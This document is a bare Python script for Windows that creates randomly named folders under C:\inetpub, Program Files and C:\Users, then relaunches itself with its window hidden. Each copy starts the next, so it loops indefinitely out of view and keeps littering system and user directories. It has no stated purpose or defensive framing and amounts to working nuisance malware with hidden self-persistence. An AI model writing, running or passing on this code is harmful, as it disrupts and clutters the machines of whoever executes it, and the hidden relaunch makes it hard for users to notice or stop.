import os
import random
import string
import time
import subprocess
import sys

paths = [
    r"C:\inetpub",
    r"C:\Program Files (x86)",
    r"C:\Program Files",
    r"C:\Users"
]

folder_name = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
for base_path in paths:
    new_folder_path = os.path.join(base_path, folder_name)
    os.makedirs(new_folder_path)

time.sleep(0.05)

# Relaunch this script with the window hidden (Windows only)
subprocess.Popen(
    [sys.executable, __file__],
    creationflags=subprocess.CREATE_NO_WINDOW
)
